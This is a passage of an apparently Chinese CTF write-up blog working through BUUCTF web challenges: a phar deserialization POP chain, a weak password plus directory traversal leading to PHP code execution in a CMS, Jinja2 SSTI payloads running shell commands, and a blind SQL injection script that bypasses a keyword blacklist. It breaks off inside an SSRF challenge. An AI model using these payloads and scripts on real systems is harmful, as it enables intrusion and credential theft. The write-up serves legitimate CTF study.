class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) //读取不可访问的属性值时调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>function.php</code> <strong>从这里可以直到上传文件的命名格式和路径</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>过程: (这里是做题的时候打的草稿)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">定位file.php的11行file_exists($file),让phar来触发反序列化</span><br><span class="line">最终目标是执行Test类的file_get方法,读取文件</span><br><span class="line">而在Test类中,调用到file_get方法的途径是: __get---get---file_get, 且在这个过程中,有:</span><br><span class="line">$value = $this-&gt;params[$key];</span><br><span class="line"></span><br><span class="line">所以需要有c为Test类的对象,且c-&gt;params[key] = &#x27;我们需要读取的文件路径&#x27;</span><br><span class="line">而现在需要触发__get, 此魔术方法在访问不存在的属性时触发,这里的key就是这个不存在的属性名</span><br><span class="line"></span><br><span class="line">浏览一下其他类的魔术方法,这里看到Show的__tostring中,有:</span><br><span class="line">$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">那么可以设置b为Show类的对象,b-&gt;str[&#x27;str&#x27;] = c  这样上边这行代码相当于访问了c-&gt;source,而c中这个属性不存在的,这样就可以触发c的__get方法,同时这里也明确了key的值为source,即c-&gt;params[&#x27;source&#x27;] = &#x27;我们需要读取的文件路径&#x27;</span><br><span class="line"></span><br><span class="line">现在需要触发Show的__tostring,此方法当对象被当作字符串时触发</span><br><span class="line"></span><br><span class="line">这里看到C1e4r的__destruct方法,有</span><br><span class="line">$this-&gt;test = $this-&gt;str;</span><br><span class="line">那么可以设置a为C1e4r的对象,a-&gt;str = b 这样在执行上面代码的时候,b会被当作字符串,从而触发__tostring</span><br><span class="line"></span><br><span class="line">而C1e4r的__destruct在其被反序列化的时候就会触发,因此Cle4r就是最外层的类</span><br></pre></td></tr></table></figure><p>分析完上述过程,就可以在本地根据这个pop链来构建<code>phar</code>文件了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&quot;/var/www/html/f1ag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;1.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;vfree.txt&#x27;</span>,<span class="string">&#x27;vfree&#x27;</span>); </span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将生成的<code>phar.phar</code>改名为符合要求的<code>phar.jpg</code>后上传:</p><p>从上面的代码中可以找到上传路径: 上传后的文件名为原文件名(<code>phar.jpg</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/aa6de1f7ebf0130753f44a728c5ccf61.jpg</span><br></pre></td></tr></table></figure><p>(这里竟然能直接访问到<code>upload</code>这个目录…)</p><img src="/images/buuctf-web4/image-20221029163527398.png" alt="image-20221029163527398" style="zoom:67%;" /><p>利用<code>phar</code>访问后成功输出了base64编码的flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/file.php?file=phar://upload/aa6de1f7ebf0130753f44a728c5ccf61.jpg</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029165237537.png" alt="image-20221029165237537"></p><br><hr><br><h1 id="CMS-目录穿越-easycms"><a href="#CMS-目录穿越-easycms" class="headerlink" title="[CMS,目录穿越]easycms"></a>[CMS,目录穿越]easycms</h1><p>提示中说后台密码5位弱口令</p><p>这里直接用目录扫描工具扫出来了<code>admin.php</code>,这里应该是登录后台的入口:</p><img src="/images/buuctf-web4/image-20221029173551131.png" alt="image-20221029173551131" style="zoom:67%;" /><p>这里因为是5位弱口令,这里直接使用用户名:<code>admin</code>,口令:<code>12345</code>成功登录</p><p>进入后台后,发现设计这里可以定制网站内容,其中右边添加区块可以添加php源代码</p><img src="/images/buuctf-web4/image-20221029174141834.png" alt="image-20221029174141834" style="zoom:67%;" /><p>那么或许可以在此命令来读取文件,并将结果直接回显在网站上</p><p>这里随便输入一点代码,保存后提示需要验证身份</p><img src="/images/buuctf-web4/image-20221029174342351.png" alt="image-20221029174342351" style="zoom:67%;" /><p>要在这个目录下创建一个文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/system/tmp/tkiw.txt</span><br></pre></td></tr></table></figure><p>找了一下,在’组件’这里发现了无需验证身份的文件上传入口:</p><img src="/images/buuctf-web4/image-20221029174618291.png" alt="image-20221029174618291" style="zoom:67%;" /><p>这里先随便上传一张图片,看一下它被保存到了哪里:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/file.php?f=202210/f_31dac2f014e8697937cf277e53af2c63.png&amp;amp;t=png&amp;amp;o=&amp;amp;s=&amp;amp;v=1667036795&quot; class=&quot;logo&quot;&gt;</span><br></pre></td></tr></table></figure><p>这里上传素材处也可以上传文件:</p><img src="/images/buuctf-web4/image-20221029174854284.png" alt="image-20221029174854284" style="zoom:67%;" /><p>随便上传一个文件之后可以看到它的存储路径:</p><img src="/images/buuctf-web4/image-20221029175059628.png" alt="image-20221029175059628" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source/default/default/1.txt</span><br></pre></td></tr></table></figure><p>我们现在需要通过重命名来将其更改为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/system/tmp/tkiw.txt</span><br><span class="line"></span><br><span class="line">目标是通过构建该上传文件的文件名,让其成功伪装成 /var/www/html/system/tmp/tkiw.txt</span><br><span class="line">目前上传文件的目录位source/default/default/,可以使用目录穿越来</span><br><span class="line">source/default/default/../../../system/tmp/tkiw.txt</span><br><span class="line"></span><br><span class="line">那么该文件可以重命名为:</span><br><span class="line">../../../system/tmp/tkiw 保存失败</span><br><span class="line">../../../../system/tmp/tkiw 保存失败</span><br><span class="line">../../../../../system/tmp/tkiw 保存成功</span><br></pre></td></tr></table></figure><p><img src="/images/buuctf-web4/image-20221029175622790.png" alt="image-20221029175622790"></p><p>此时再去添加代码就能够成功保存了: 然后将代码添加到网页内容中</p><p><img src="/images/buuctf-web4/image-20221029175913605.png" alt="image-20221029175913605" style="zoom: 50%;" /><img src="/images/buuctf-web4/image-20221029180038632.png" alt="image-20221029180038632" style="zoom:50%;" /></p><p>此时再打开网站首页,发现命令被成功执行了</p><img src="/images/buuctf-web4/image-20221029180107203.png" alt="image-20221029180107203" style="zoom:67%;" /><p>此时将代码改为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>也能成功执行:</p><img src="/images/buuctf-web4/image-20221029180210871.png" alt="image-20221029180210871" style="zoom:67%;" /><br><hr><br><h1 id="RootersCTF2019-I-lt-3-Flask"><a href="#RootersCTF2019-I-lt-3-Flask" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h1><p>进来啥也没有,就感觉可能是SSTI:</p><p><img src="/images/buuctf-web4/image-20221029192548384.png" alt="image-20221029192548384"></p><p>使用<code>Arjun</code>爆破一下请求参数, 这里爆破出了<code>name</code></p><p>这里尝试传参,果然存在SSTI:</p><img src="/images/buuctf-web4/image-20221029192638577.png" alt="image-20221029192638577" style="zoom:67%;" /><p>这里直接拿现成的payload来试试,竟然没有过滤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">输出:</span><br><span class="line">I ♥ Flask &amp; application.py flag.txt requirements.txt static templates</span><br><span class="line"></span><br><span class="line">再读取一下就出flag了:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h1><p>简单粗暴,上来连语句都给了:</p><img src="/images/buuctf-web4/image-20221030090253162.png" alt="image-20221030090253162" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>先搜集一下其他信息: 访问<code>robots.txt</code>发现有提示:</p><p><img src="/images/buuctf-web4/image-20221030090348304.png" alt="image-20221030090348304"></p><p><code>hint.txt</code>中直接给了过滤词,而且说只要密码是admin的密码就可以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>过滤得好多.. 这里先分析一下, 这里用户名甚至都没法用<code>admin</code>,基本的过滤方法都没法用</p><p>这里转义符没被过滤,双引号没被过滤,分号没被过滤</p><p>这里试一下<code>转义符</code>,<code>username</code>输入<code>\</code></p><p>这样整个语句就变成了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;&#x27;</span><br><span class="line">username后面的单引号被注释掉, 前面的单引号被迫和passwd后的单引号闭合,这样查询时的username的值为:</span><br><span class="line">&#x27; and passwd=</span><br></pre></td></tr></table></figure><p>因为题目要求最后passwd的值需要通过验证,所以重新构造一个<code>passwd</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里被过滤的空格使用/**/代替,等于号和like被过滤,这里换成正则匹配regexp</span><br><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||username/**/regexp/**/&quot;^a&quot;;%00&#x27;</span><br><span class="line">这里因为已知username的值为admin,所以 先让username去正则匹配一下a开头</span><br><span class="line">这里passwd的值输入:||username/**/regexp/**/&quot;^a&quot;;%00</span><br><span class="line">(这里%00是为了截断后面的单引号,虽然它是过滤词,但是在发送请求的过程中%00就被编码了,所以不会被检测处来)</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web4/image-20221030093402613.png" alt="image-20221030093402613" style="zoom:67%;" /><p>这里发现响应包将我们重定向到了<code>welcome.php</code>这就说明匹配成功了</p><p>那么接下来就可以用同样的方法去盲注获得密码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;||passwd/**/regexp/**/&quot;^a&quot;;&#x27;</span><br><span class="line">其中输入的passwd的值为:||passwd/**/regexp/**/&quot;^a&quot;;</span><br></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#chars = string.printable[:]  # 这里不这样是因为其中包含的*,.等符号会导致正则匹配出现歧义</span></span><br><span class="line">chars = <span class="string">&#x27;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_&#x27;</span></span><br><span class="line"><span class="comment"># print(chars)</span></span><br><span class="line">base_url = <span class="string">&quot;http://07f7d3e5-e832-4b8e-82d3-b0b1f1589b9c.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>():</span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chars:</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(password+c, parse.unquote(<span class="string">&#x27;%00&#x27;</span>))</span><br><span class="line">            &#125; <span class="comment"># 这里使用urllib.parse.unquote来对%00进行解码</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="built_in">print</span>(data[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line">            res = session.post(base_url, data=data).text</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;welcome&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">                password = password + c</span><br><span class="line">                <span class="built_in">print</span>(password)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">get_data()</span><br><span class="line"></span><br><span class="line">密码:you_will_never_know7788990</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="利用组件url解析不一致进行SSRF-SSRF-Training"><a href="#利用组件url解析不一致进行SSRF-SSRF-Training" class="headerlink" title="[利用组件url解析不一致进行SSRF]SSRF Training"></a>[利用组件url解析不一致进行SSRF]SSRF Training</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);  <span class="comment"># 这里对url进行解析,解析成数组</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];  <span class="comment"># 取host字段进行验证</span></span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); <span class="comment"># 返回主机名对应的ip地址</span></span><br><span class="line">    <span 